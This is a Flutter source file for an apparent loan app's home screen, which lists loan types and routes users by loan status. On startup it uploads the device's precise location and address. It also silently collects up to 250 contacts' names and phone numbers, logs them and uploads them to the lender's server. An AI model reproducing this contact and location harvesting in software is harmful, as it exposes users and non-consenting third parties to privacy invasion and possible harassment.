import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:carousel_slider/carousel_slider.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:fincalis/business/BusinessDetailsScreen1.dart';
import 'package:fincalis/employe/EmployeeDetailsScreen.dart';
import 'package:fincalis/screens/AutheticationPending.dart';
import 'package:fincalis/screens/BasicDetailsScreen.dart';
import 'package:fincalis/screens/CreditScore.dart';
import 'package:fincalis/screens/LoanApplication.dart';
import 'package:fincalis/screens/PrivacyPolicy.dart';
import 'package:fincalis/screens/ProfileScreen.dart';
import 'package:fincalis/screens/aboutus.dart';
import 'package:fincalis/screens/KYCProcessScreen.dart';
import 'package:fincalis/screens/helpsupport.dart';
import 'package:fincalis/screens/RepaymentHistory.dart';
import 'package:fincalis/screens/pendingDisbursalScreen.dart';
import 'package:fincalis/screens/referalcode.dart';
import 'package:fincalis/screens/signup.dart';
import 'package:fincalis/screens/splash.dart';
import 'package:fincalis/screens/terms.dart';
import 'package:fincalis/student/StudentDetailsScreen.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:geocoding/geocoding.dart';
import 'package:geolocator/geolocator.dart';
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:url_launcher/url_launcher.dart';
import 'dart:developer' as developer;
import '../Services/other_services.dart';
import '../Services/user_api.dart';
import '../model/ListOfLoanTypesModel.dart';
import '../model/SubmittDataModel.dart';
import '../student/selfie.dart';
import '../utils/Preferances.dart';
import 'DisbursedScreen.dart';
import 'EMITenuresScreen.dart';
import 'PanDetailsScreen.dart';
import 'PendingScreen.dart';
import 'Registration.dart';
import 'RejectScreen.dart';
import 'banktransfer.dart';
import 'congratulations.dart';
import 'emilist.dart';
import 'loanoverview.dart';

class MyMainHome extends StatefulWidget {
  const MyMainHome({Key? key}) : super(key: key);

  @override
  State<MyMainHome> createState() => _MyMainHomeState();
}

class _MyMainHomeState extends State<MyMainHome> {
  File? file;
  List<Contact> _contacts = [];
  var isDeviceConnected = "";
  List<ConnectivityResult> _connectionStatus = [ConnectivityResult.none];
  final Connectivity _connectivity = Connectivity();
  late StreamSubscription<List<ConnectivityResult>> _connectivitySubscription;
  int currentIndex = 0;
  var lattitude;
  var longitude;
  var address;

  final List<String> imgList = [
    'assets/loanimg1.png',
    'assets/loanimg1.png',
    'assets/loanimg1.png',
  ];

  String name = "";
  String email = "";
  String profile_image = "";

  bool is_loading = true;
  bool is_selected = false;

  int loan_id = 0;
  String loan_status = "";

  @override
  void initState() {
    super.initState();
    get_lat_log();
    GetPrifileData();
    GetListOfLoanTypes();
    GetBannersList();
    GettingLoanStatus1();
    initConnectivity();
    _connectivitySubscription =
        _connectivity.onConnectivityChanged.listen(_updateConnectionStatus);
  }

  Future<void> GetBannersList() async {
    var Userid = await PreferenceService().getString('user_id');
    await UserApi.GetBannersApi().then((data) => {
          if (data != null)
            {
              setState(() {
                if (data.settings?.success == 1) {
                } else {}
              })
            }
        });
  }

  void get_lat_log() async {
    Position position = await Geolocator.getCurrentPosition(
        desiredAccuracy: LocationAccuracy.high);
    List<Placemark> placemarks =
        await placemarkFromCoordinates(position.latitude, position.longitude);
    setState(() {
      lattitude = position.latitude;
      longitude = position.longitude;
      address =
          "${placemarks[0].subLocality.toString() + "," + placemarks[0].street!.toString() + "," + placemarks[0].locality!.toString()}";
    });
    SendigUserLatlongs();
  }

  Future<void> SendigUserLatlongs() async {
    var Userid = await PreferenceService().getString('user_id');
    await UserApi.SendigUserLatlongsApi(
            Userid!, lattitude.toString(), longitude.toString(), address)
        .then((data) => {
              if (data != null)
                {
                  setState(() {
                    if (data.success == 1) {}
                  })
                }
            });
  }

  Future<void> _requestPermissions() async {
    try {
      if (await Permission.contacts.request().isGranted) {
        _loadContacts();
      } else {
        // Handle permission denied
        print("Permission denied");
      }
    } catch (e) {
      print('Error requesting permissions: $e');
    }
  }

  Future<void> _loadContacts() async {
    Iterable<Contact> contacts = await ContactsService.getContacts();

    // Convert the iterable to a list
    List<Contact> contactList = contacts.toList();

    // Limit the list to a maximum of 250 contacts
    if (contactList.length > 250) {
      contactList = contactList.sublist(0, 250);
    }

    // Update the state with the limited list of contacts
    setState(() {
      _contacts = contactList;
    });

    // Call _saveContactsToJson after loading contacts
    await _saveContactsToJson();
  }

  Future<void> _saveContactsToJson() async {
    List<Map<String, dynamic>> contactsList = _contacts.map((contact) {
      return {
        'displayName': contact.displayName,
        'phones': contact.phones?.map((item) => item.value).toList(),
      };
    }).toList();

    String jsonString = jsonEncode(contactsList);
    print(jsonString);

    final directory = await getApplicationDocumentsDirectory();
    file = File('${directory.path}/contacts.json');
    await file?.writeAsString(jsonString);
    print("Contacts file: ${file}");

    await _uploadContactsFile();
  }

  Future<void> _uploadContactsFile() async {
    try {
      var userId = await PreferenceService().getString('user_id');
      if (file != null && userId != null) {
        // Assuming UserApi.submitContactApi is correctly implemented
        SubmittDataModel? data = await UserApi.submitContactApi(file!, userId);

        if (data != null && data.success == 1) {
          print("Upload successful");
          print("MyUserId::: $userId");
        } else {
          print("Upload failed");
          if (data != null) {
            print("Response data: ${data.toJson()}");
          }
        }
      } else {
        print("File or userId is null");
      }
    } catch (e) {
      // Handle any errors that occur during the upload process
      print("Exception during upload: $e");
    }
  }

  Future<void> GetPrifileData() async {
    var Userid = await PreferenceService().getString('user_id');
    await UserApi.GetProfileApi(Userid!).then((data) => {
          if (data != null)
            {
              setState(() {
                if (data.settings?.success == 1) {
                  name = data.data?.result?.fullName ?? "";
                  email = data.data?.result?.email ?? "";
                  profile_image = data.data?.result?.image ?? "";
                  if (data.data?.result?.is_contact_added == false) {
                    _requestPermissions();
                  }
                } else {}
              })
            }
        });
  }

  Future<void> initConnectivity() async {
    List<ConnectivityResult> result;
    try {
      // Check connectivity and get the result
      result = await _connectivity.checkConnectivity();
    } on PlatformException catch (e) {
      developer.log('Couldn\'t check connectivity status', error: e);
      return;
    }

    // If the widget was removed from the tree while the asynchronous platform
    // message was in flight, we want to discard the reply rather than calling
    // setState to update our non-existent appearance.
    if (!mounted) {
      return Future.value(null);
    }

    // Update connection status based on the single ConnectivityResult
    return _updateConnectionStatus(result);
  }

  Future<void> _updateConnectionStatus(List<ConnectivityResult> result) async {
    setState(() {
      _connectionStatus = result;
      for (int i = 0; i < _connectionStatus.length; i++) {
        setState(() {
          isDeviceConnected = _connectionStatus[i].toString();
          print("isDeviceConnected:${isDeviceConnected}");
        });
      }
    });
    print('Connectivity changed: $_connectionStatus');
  }

  List<Result>? result = [];

  Future<void> GetListOfLoanTypes() async {
    try {
      final data = await UserApi.GetListOfLoanTypesApi();
      if (data != null) {
        if (data.settings?.success == 1) {
          setState(() {
            result = data.data?.result;
            is_loading = false;
          });
        } else {
          is_loading = false;
          // Handle API-specific error
          // For example: show an error message to the user
        }
      }
    } on SocketException catch (e) {
      // Handle network error
      print('Network error: $e');
      // You might want to show an alert dialog or a snackbar with an error message
    } catch (e) {
      // Handle other exceptions
      print('An error occurred: $e');
      // You might want to show an alert dialog or a snackbar with an error message
    } finally {
      setState(() {
        is_loading = false; // Stop loading regardless of success or error
      });
    }
  }

  Future<void> SelectLoanType(id) async {
// Assuming 'Userid' is a String
    var userIdString = await PreferenceService().getString('user_id');

// Convert the String to an int
    int userId = int.parse(userIdString!);

    await UserApi.SelectLoanTypeAPI(userId!, id).then((data) => {
          if (data != null)
            {
              setState(() {
                if (data.success == 1) {
                  GettingLoanStatus();
                } else {}
              })
            }
        });
  }

  Future<void> GettingLoanStatus() async {
    var Userid = await PreferenceService().getString('user_id');
    await UserApi.GettingLoanStatusAPI(Userid!).then((data) => {
          if (data != null)
            {
              setState(() async {
                if (data.settings?.success == 1) {
                  loan_id = data.data?.result?.id ?? 0;
                  loan_status = data.data?.result?.loanStatus ?? "";
                  if (data.data?.result?.loanStatus == "under review") {
                    is_selected = false;
                    var res = await Navigator.push(context,
                        MaterialPageRoute(builder: (context) => Pending()));
                    if (res == true) {
                      is_loading = true;
                      GetListOfLoanTypes();
                      GettingLoanStatus1();
                    }
                  } else if (data.data?.result?.loanStatus == "verified") {
                    GettingSubscriptionStatus();
                  } else if (data.data?.result?.loanStatus == "initiated") {
                    is_selected = false;
                    var res = await Navigator.push(
                        context,
                        MaterialPageRoute(
                            builder: (context) => Kycprocessscreen()));
                    if (res == true) {
                      is_loading = true;
                      GetListOfLoanTypes();
                      GettingLoanStatus1();
                    }
                  } else if (data.data?.result?.loanStatus ==
                      "disbursed pending") {
                    is_selected = false;
                    var res = await Navigator.push(
                        context,
                        MaterialPageRoute(
                            builder: (context) => PendingDisbursal()));
                    if (res == true) {
                      is_loading = true;
                      GetListOfLoanTypes();
                      GettingLoanStatus1();
                    }
                  } else if (data.data?.result?.loanStatus == "disbursed") {
                    is_selected = false;
                    var res = await Navigator.push(
                        context,
                        MaterialPageRoute(
                            builder: (context) => Disbursedscreen()));
                    if (res == true) {
                      is_loading = true;
                      GetListOfLoanTypes();
                      GettingLoanStatus1();
                    }
                  } else if (data.data?.result?.loanStatus == "rejected") {
                    is_selected = false;
                    var res = await Navigator.push(context,
                        MaterialPageRoute(builder: (context) => Reject()));
                    if (res == true) {
                      is_loading = true;
                      GetListOfLoanTypes();
                      GettingLoanStatus1();
                    }
                  }
                  print("${data.data?.result?.loanStatus}");
                } else {
                  is_selected = false;
                }
              })
            }
        });
  }

  Future<void> GettingSubscriptionStatus() async {
    var Userid = await PreferenceService().getString('user_id');
    await UserApi.GettingSubscriptionStatusApi(Userid!).then((data) => {
          if (data != null)
            {
              setState(() async {
                if (data.settings?.success == 1) {
                  is_selected = false;
                  if (data.data?.result?.status ==
                      "Authentication is pending") {
                    var res = await Navigator.push(
                        context,
                        MaterialPageRoute(
                            builder: (context) => AuthenticationPending()));

                    if (res == true) {
                      is_loading = true;
                      GetListOfLoanTypes();
                      GettingLoanStatus1();
                    }
                  } else if (data.data?.result == null) {
                    var res = await Navigator.push(
                        context,
                        MaterialPageRoute(
                            builder: (context) => AuthenticationPending()));

                    if (res == true) {
                      is_loading = true;
                      GetListOfLoanTypes();
                      GettingLoanStatus1();
                    }
                  }
                  ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                    content: Text(
                      "${data.settings?.message}.",
                      style: TextStyle(color: Color(0xff000000)),
                    ),
                    duration: Duration(seconds: 1),
                    backgroundColor: Color(0xFFCDE2FB),
                  ));
                } else {
                  is_selected = false;
                  ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                    content: Text(
                      "${data.settings?.message}.",
                      style: TextStyle(color: Color(0xff000000)),
                    ),
                    duration: Duration(seconds: 1),
                    backgroundColor: Color(0xFFCDE2FB),
                  ));
                  var res = await Navigator.push(
                      context,
                      MaterialPageRoute(
                          builder: (context) => MyCongratulations()));
                  if (res == true) {
                    is_loading = true;
                    GetListOfLoanTypes();
                    GettingLoanStatus1();
                  }
                }
              })
            }
        });
  }

  Future<void> GettingLoanStatus1() async {
    var Userid = await PreferenceService().getString('user_id');
    await UserApi.GettingLoanStatusAPI(Userid!).then((data) => {
          if (data != null)
            {
              setState(() {
                if (data.settings?.success == 1) {
                  is_selected = false;
                  loan_id = data.data?.result?.loanTypeId ?? 0;
                  loan_status = data.data?.result?.loanStatus ?? "";
                }
              })
            }
        });
  }

  Future<void> _refresh() async {
    await Future.delayed(Duration(seconds: 1)); // Simulate a network call
    setState(() {
      GetPrifileData();
      GetListOfLoanTypes();
      GettingLoanStatus1();
      is_loading = true;
    });
  }

  void _launchURL() async {
    final Uri url = Uri.parse('https://cfre.in/63u0die');
    if (!await launchUrl(url)) {
      throw Exception('Could not launch $url');
    }
  }

  @override
  Widget build(BuildContext context) {
    double screenWidth = MediaQuery.of(context).size.width;
    double screenHeight = MediaQuery.of(context).size.height;
    String nameInitial =
        (name.trim().isNotEmpty) ? name.trim()[0].toUpperCase() : "";
    return WillPopScope(
      onWillPop: () async {
        // Exit the app
        SystemNavigator.pop();
        // Return false to prevent default back navigation behavior
        return false;
      },
      child: (isDeviceConnected == "ConnectivityResult.wifi" ||
              isDeviceConnected == "ConnectivityResult.mobile")
          ? Scaffold(
              appBar: AppBar(
                title: Row(
                  children: [
                    Container(
                      width: screenWidth * 0.65,
                      child: Text(
                        "Welcome ${name}",
                        overflow: TextOverflow.ellipsis,
                        style: TextStyle(
                            fontSize: 22,
                            fontWeight: FontWeight.w500,
                            fontFamily: "Inter"),
                      ),
                    ),
                  ],
                ),
                backgroundColor: Colors.white,
                iconTheme: IconThemeData(color: Colors.black),
              ),
              drawer: Drawer(
                width: screenWidth * 0.85,
                child: ListView(
                  padding: EdgeInsets.zero,
                  children: <Widget>[
                    SizedBox(height: screenHeight * 0.05),
                    Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Row(
                          children: [
                            SizedBox(
                              width: 15,
                            ),
                            CircleAvatar(
                              radius: 40,
                              backgroundColor: Color(0xff80C4E9),
                              backgroundImage: profile_image != null
                                  ? NetworkImage(profile_image!)
                                  : null,
                              child: profile_image == ""
                                  ? Text(
                                      nameInitial,
                                      style: const TextStyle(
                                        fontSize: 50,
                                        color: Color(0xffFFF6E9),
                                      ),
                                    )
                                  : null, // If profile_image is not null, do not show the Text
                            ),
                            Padding(
                              padding: const EdgeInsets.only(left: 20),
                              child: Column(
                                crossAxisAlignment: CrossAxisAlignment.start,
                                children: [
                                  SizedBox(
                                    height: 10,
                                  ),
                                  Container(
                                    width: screenWidth * 0.5,
                                    child: Text(
                                      name,
                                      maxLines: 1,
                                      overflow: TextOverflow.ellipsis,
                                      style: TextStyle(
                                          fontFamily: "Inter",
                                          color: Color(0xFF000000),
                                          fontSize: 20,
                                          fontWeight: FontWeight.w600),
                                    ),
                                  ),
                                  Text(
                                    email,
                                    style: TextStyle(
                                        color: Color(0xFF6B7280),
                                        fontSize: 12,
                                        fontWeight: FontWeight.w300),
                                  ),
                                  SizedBox(
                                    height: 15,
                                  ),
                                  // GestureDetector(
                                  //   onTap: (){
                                  //     Navigator.push(context,MaterialPageRoute(builder:(context)=>ProfileDetails()));
                                  //   },
                                  //   child: Text(
                                  //     "View profile",
                                  //     style: TextStyle(
                                  //       fontFamily: "Inter",
                                  //       color: Color(0xFF6B7280),
                                  //       fontSize: 15,
                                  //       fontWeight: FontWeight.w500,
                                  //       decoration: TextDecoration.underline, // Add this line to apply underline
                                  //     ),
                                  //   )
                                  // ),
                                ],
                              ),
                            )
                          ],
                        ),
                        SizedBox(height: 20),
                        Padding(
                          padding: const EdgeInsets.symmetric(horizontal: 15),
                          child: Divider(
                            color: Colors.grey,
                          ),
                        ),
                        SizedBox(height: 30),
                      ],
                    ),
                    ListTile(
                      leading: Icon(Icons.schedule),
                      title: Text(
                        'Loan History',
                        style: TextStyle(
                            fontSize: 16,
                            fontWeight: FontWeight.w400,
                            fontFamily: "Inter"),
                      ),
                      trailing: Icon(Icons.arrow_forward_ios, size: 20),
                      onTap: () {
                        Navigator.push(
                            context,
                            MaterialPageRoute(
                                builder: (context) => Repaymenthistory()));
                      },
                    ),
                    ListTile(
                      leading: Icon(Icons.headset_mic_outlined),
                      title: Text(
                        'Help and Support',
                        style: TextStyle(
                            fontSize: 16,
                            fontWeight: FontWeight.w400,
                            fontFamily: "Inter"),
                      ),
                      trailing: Icon(Icons.arrow_forward_ios, size: 20),
                      onTap: () {
                        Navigator.push(
                            context,
                            MaterialPageRoute(
                                builder: (context) => MyHelpSupport()));
                      },
                    ),
                    ListTile(
                      leading: Image(
                          image: AssetImage("assets/gift.png"), width: 24),
                      title: Text(
                        'Refer and Earn',
                        style: TextStyle(
                            fontSize: 16,
                            fontWeight: FontWeight.w400,
                            fontFamily: "Inter"),
                      ),
                      trailing: Icon(Icons.arrow_forward_ios, size: 20),
                      onTap: () {
                        Navigator.push(
                            context,
                            MaterialPageRoute(
                                builder: (context) => MyReferal()));
                      },
                    ),
                    ListTile(
                      leading: Icon(Icons.privacy_tip_outlined),
                      title: Text(
                        'Privacy Policy',
                        style: TextStyle(
                            fontSize: 16,
                            fontWeight: FontWeight.w400,
                            fontFamily: "Inter"),
                      ),
                      trailing: Icon(Icons.arrow_forward_ios, size: 20),
                      onTap: () {
                        Navigator.push(
                            context,
                            MaterialPageRoute(
                                builder: (context) => PrivacyPolicy()));
                      },
                    ),
                    ListTile(
                      leading: Image(
                          image: AssetImage("assets/termsandconditions.png"),
                          width: 24),
                      title: Text(
                        'Terms And Conditions',
                        style: TextStyle(
                            fontSize: 16,
                            fontWeight: FontWeight.w400,
                            fontFamily: "Inter"),
                      ),
                      trailing: Icon(Icons.arrow_forward_ios, size: 20),
                      onTap: () {
                        Navigator.push(context,
                            MaterialPageRoute(builder: (context) => MyTerms()));
                      },
                    ),
                    ListTile(
                      leading: Image(
                          image: AssetImage("assets/aboutusicon.png"),
                          width: 24),
                      title: Text(
                        'About Us',
                        style: TextStyle(
                            fontSize: 16,
                            fontWeight: FontWeight.w400,
                            fontFamily: "Inter"),
                      ),
                      trailing: Icon(Icons.arrow_forward_ios, size: 20),
                      onTap: () {
                        Navigator.push(
                            context,
                            MaterialPageRoute(
                                builder: (context) => MyAboutUs()));
                      },
                    ),
                    // ListTile(
                    //   leading: Icon(Icons.help_outline_outlined),
                    //   title: Text('FAQ’s',
                    //     style: TextStyle(
                    //         fontSize: 16,
                    //         fontWeight: FontWeight.w400,
                    //         fontFamily: "Inter"
                    //     ),
                    //   ),
                    //   trailing: Icon(Icons.arrow_forward_ios, size: 20),
                    //   onTap: () {
                    //     Navigator.push(
                    //         context, MaterialPageRoute(builder: (context) => MyFAQ()));
                    //   },
                    // ),
                    // ListTile(
                    //   leading: Icon(Icons.settings),
                    //   title: Text('Settings'),
                    //   trailing: Icon(Icons.arrow_forward_ios, size: 24),
                    //   onTap: () {
                    //     // Handle navigation to settings
                    //   },
                    // ),
                    ListTile(
                      leading: Icon(Icons.logout),
                      title: Text(
                        'Logout',
                        style: TextStyle(
                            fontSize: 16,
                            fontWeight: FontWeight.w400,
                            fontFamily: "Inter"),
                      ),
                      trailing: Icon(Icons.arrow_forward_ios, size: 20),
                      onTap: () {
                        _showLogoutSheet(context);
                      },
                    ),
                  ],
                ),
              ),
              body: (is_loading || is_selected)
                  ? Center(
                      child: CircularProgressIndicator(
                        color: Color(0xff4EBEFD),
                      ),
                    )
                  : RefreshIndicator(
                      onRefresh: _refresh,
                      color: Color(0xff4EBEFD),
                      child: SingleChildScrollView(
                        physics: AlwaysScrollableScrollPhysics(),
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            SizedBox(height: screenHeight * 0.02),
                            CarouselSlider(
                              options: CarouselOptions(
                                aspectRatio: 1.0,
                                height: screenHeight *
                                    0.25, // Adjusted height for carousel
                                enlargeCenterPage: true,
                                scrollDirection: Axis.horizontal,
                                autoPlay: true,
                                viewportFraction: 0.9,
                                pauseAutoPlayOnTouch: true,
                                onPageChanged: (index, reason) {
                                  setState(() {
                                    currentIndex = index;
                                  });
                                },
                              ),
                              items: imgList.map((item) {
                                return InkWell(
                                  onTap: () async {
                                    // var res = await Navigator.push(
                                    //   context,
                                    //   MaterialPageRoute(
                                    //       builder: (context) =>EmploymentDetails(isBasicCompleted: true)),
                                    // );
                                    // if(res == true){
                                    //   print("HEllo Fincalis");
                                    // }
                                    // _launchURL();
                                  },
                                  child: Builder(
                                    builder: (BuildContext context) {
                                      return Padding(
                                        padding: EdgeInsets.symmetric(
                                            vertical: screenHeight * 0.02),
                                        child: Image.asset(
                                          item,
                                          fit: BoxFit
                                              .contain, // Adjust fit for better image display
                                        ),
                                      );
                                    },
                                  ),
                                );
                              }).toList(),
                            ),
                            SizedBox(height: screenHeight * 0.02),
                            Row(
                              mainAxisAlignment: MainAxisAlignment.center,
                              children: imgList.asMap().entries.map((entry) {
                                bool isActive = currentIndex == entry.key;
                                return Container(
                                  width: isActive ? 17.0 : 7.0,
                                  height: 7.0,
                                  margin: EdgeInsets.symmetric(horizontal: 3.0),
                                  decoration: BoxDecoration(
                                    shape: BoxShape.circle,
                                    color: isActive
                                        ? Color(0xFF00A3FF)
                                        : Color(0xFFC9EAF2),
                                  ),
                                );
                              }).toList(),
                            ),
                            SizedBox(height: screenHeight * 0.03),
                            // GridView wrapped in an Expanded widget
                            SizedBox(
                              // Remove height and use shrinkWrap
                              child: GridView.builder(
                                shrinkWrap:
                                    true, // Adjust height based on content
                                physics: NeverScrollableScrollPhysics(),
                                scrollDirection: Axis.vertical,
                                gridDelegate:
                                    SliverGridDelegateWithFixedCrossAxisCount(
                                  crossAxisCount: 1,
                                  childAspectRatio: screenWidth /
                                      (screenHeight *
                                          0.18), // Adjust aspect ratio
                                ),
                                itemCount: result!.length,
                                itemBuilder: (context, index) {
                                  String formatLoanStatus(String status) {
                                    if (status.isEmpty) return '';
                                    return '${status[0].toUpperCase()}${status.substring(1)}';
                                  }

                                  return Container(
                                    padding: EdgeInsets.symmetric(
                                        horizontal: screenWidth * 0.03,
                                        vertical: screenHeight * 0.005),
                                    child: Card(
                                      color: Color(0xFFE3EEFF),
                                      child: Padding(
                                        padding:
                                            EdgeInsets.all(screenWidth * 0.04),
                                        child: Row(
                                          crossAxisAlignment:
                                              CrossAxisAlignment.start,
                                          children: [
                                            Column(
                                              crossAxisAlignment:
                                                  CrossAxisAlignment.start,
                                              children: [
                                                Text(
                                                  result![index].name ??
                                                      "", // Replace with dynamic data
                                                  style: TextStyle(
                                                    color: Color(0xFF000000),
                                                    fontWeight: FontWeight.w500,
                                                    fontSize:
                                                        18, // Responsive font size
                                                    fontFamily: 'Inter',
                                                  ),
                                                ),
                                                SizedBox(
                                                  height: screenHeight * 0.02,
                                                ),
                                                Text(
                                                  "Available Credit", // Replace with dynamic data
                                                  style: TextStyle(
                                                    color: Color(0xFF000000),
                                                    fontWeight: FontWeight.w400,
                                                    fontSize:
                                                        13, // Responsive font size
                                                    fontFamily: 'Inter',
                                                  ),
                                                ),
                                                SizedBox(
                                                  height: screenHeight * 0.01,
                                                ),
                                                Text(
                                                  "up to ${result![index].limit ?? ""}", // Replace with dynamic data
                                                  style: TextStyle(
                                                    color: Colors.black,
                                                    fontWeight: FontWeight.w600,
                                                    fontFamily: 'Inter',
                                                    fontSize:
                                                        18, // Responsive font size
                                                  ),
                                                ),
                                              ],
                                            ),
                                            Spacer(),
                                            InkWell(
                                              onTap: () {
                                                if (is_selected) {
                                                } else {
                                                  setState(() {
                                                    is_selected = true;
                                                  });
                                                  SelectLoanType(
                                                      result![index].id);
                                                }
                                              },
                                              child: Padding(
                                                padding: EdgeInsets.only(
                                                    top: screenHeight * 0.033,
                                                    right: screenWidth * 0.02),
                                                child: Container(
                                                  height: screenHeight *
                                                      0.05, // Responsive button height
                                                  // width: screenWidth * 0.3, // Responsive button width
                                                  padding: EdgeInsets.only(
                                                      left: 15, right: 15),
                                                  decoration: BoxDecoration(
                                                      color: Color(0xFF2DB3FF),
                                                      borderRadius:
                                                          BorderRadius.circular(
                                                              8)),
                                                  child: Center(
                                                      child: Text(
                                                    (loan_id ==
                                                            result![index].id)
                                                        ? formatLoanStatus(
                                                            loan_status)
                                                        : "Apply",
                                                    style: TextStyle(
                                                        color:
                                                            Color(0xFFFFFFFF),
                                                        fontFamily: 'Poppins',
                                                        fontWeight:
                                                            FontWeight.w600,
                                                        fontSize:
                                                            18), // Responsive font size
                                                  )),
                                                ),
                                              ),
                                            )
                                          ],
                                        ),
                                      ),
                                    ),
                                  );
                                },
                              ),
                            ),
                          ],
                        ),
                      ),
                    ))
          : NoInternetWidget(),
    );
  }

  Widget _buildCard(String title, String amount) {
    return Padding(
      padding: const EdgeInsets.all(8.0),
      child: GestureDetector(
        onTap: () {
          Navigator.push(context,
              MaterialPageRoute(builder: (context) => Kycprocessscreen()));
          //   SelectLoanType();
        },
        child: Card(
          shadowColor: Color(0xFF000000).withOpacity(0.25),
          elevation: 4,
          color: Color(0xFFC9EAF2),
          child: Padding(
            padding: const EdgeInsets.all(16.0),
            child: Row(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Column(
                  mainAxisAlignment: MainAxisAlignment.start,
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      title,
                      style: TextStyle(
                        color: Color(0xFF000000),
                        fontWeight: FontWeight.w500,
                        fontSize: 18,
                        fontFamily: 'Inter',
                      ),
                    ),
                    SizedBox(
                      height: 15,
                    ),
                    Text(
                      "Available Credit",
                      style: TextStyle(
                        color: Color(0xFF000000),
                        fontWeight: FontWeight.w400,
                        fontSize: 10,
                        fontFamily: 'Inter',
                      ),
                    ),
                    SizedBox(
                      height: 6,
                    ),
                    Text(
                      amount,
                      style: TextStyle(
                        color: Colors.black,
                        fontWeight: FontWeight.w800,
                        fontSize: 15,
                      ),
                    ),
                  ],
                ),
                const Spacer(),
                Padding(
                  padding: const EdgeInsets.only(top: 20, right: 4),
                  child: Container(
                    height: 38,
                    width: 100,
                    decoration: BoxDecoration(
                        color: Color(0xFF2DB3FF),
                        borderRadius: BorderRadius.circular(8)),
                    child: Center(
                        child: Text(
                      "Apply",
                      style: TextStyle(
                          color: Color(0xFFFFFFFF),
                          fontFamily: 'Poppins',
                          fontSize: 20),
                    )),
                  ),
                )
              ],
            ),
          ),
        ),
      ),
    );
  }

  Future<void> _showLogoutSheet(context) async {
    double screenWidth = MediaQuery.of(context).size.width;
    double screenHeight = MediaQuery.of(context).size.height;

    showModalBottomSheet(
      context: context,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(15.0)),
      ),
      isScrollControlled: true,
      builder: (BuildContext context) {
        return SafeArea(child: StatefulBuilder(
          builder: (BuildContext context, StateSetter setState) {
            return SizedBox(
              width: screenWidth,
              height: MediaQuery.of(context).size.height * 0.23,
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.center,
                children: <Widget>[
                  SizedBox(
                    height: 50,
                  ),
                  Text(
                    "Oh no, You’re leaving!",
                    style: TextStyle(
                      fontFamily: 'Inter',
                      fontSize: 18,
                      fontWeight: FontWeight.w600,
                      overflow: TextOverflow.ellipsis,
                    ),
                  ),
                  SizedBox(
                    height: 10,
                  ),
                  Text(
                    "Are you sure want to leave?",
                    style: TextStyle(
                      fontFamily: 'Inter',
                      color: Color(0xFFBABECF),
                      fontSize: 13,
                    ),
                  ),
                  SizedBox(
                    height: 20,
                  ),
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                    children: [
                      Container(
                        width: 170,
                        height: 38,
                        decoration: BoxDecoration(
                          border:
                              Border.all(color: Color(0xFFE0E3F1), width: 0.7),
                          borderRadius: BorderRadius.circular(19.31),
                        ),
                        child: TextButton(
                          style: ButtonStyle(
                              overlayColor:
                                  MaterialStatePropertyAll(Colors.transparent)),
                          onPressed: () {
                            Navigator.pop(context);
                            setState(() {
                              PreferenceService().clearPreferences();
                              Navigator.push(
                                context,
                                MaterialPageRoute(
                                    builder: (context) =>
                                        MySignup()), // Replace with your next screen
                              );
                            });
                          },
                          child: const Text(
                            "Log Out",
                            style: TextStyle(
                                fontSize: 13,
                                fontFamily: 'Inter',
                                color: Colors.black,
                                fontWeight: FontWeight.w600),
                          ),
                        ),
                      ),
                      Container(
                        width: 170,
                        height: 38,
                        decoration: BoxDecoration(
                          border: Border.all(color: Color(0xFF2DB3FF)),
                          borderRadius: BorderRadius.circular(19.31),
                          color: Color(0xFF2DB3FF),
                        ),
                        child: TextButton(
                          style: ButtonStyle(
                              overlayColor:
                                  MaterialStatePropertyAll(Colors.transparent)),
                          onPressed: () {
                            setState(() {
                              Navigator.pop(context);
                            });
                          },
                          child: const Text(
                            "Cancel",
                            style: TextStyle(
                                fontSize: 13,
                                fontFamily: 'Inter',
                                color: Colors.white,
                                fontWeight: FontWeight.w600),
                          ),
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(
                    height: 10,
                  )
                ],
              ),
            );
          },
        ));
      },
    );
  }
}
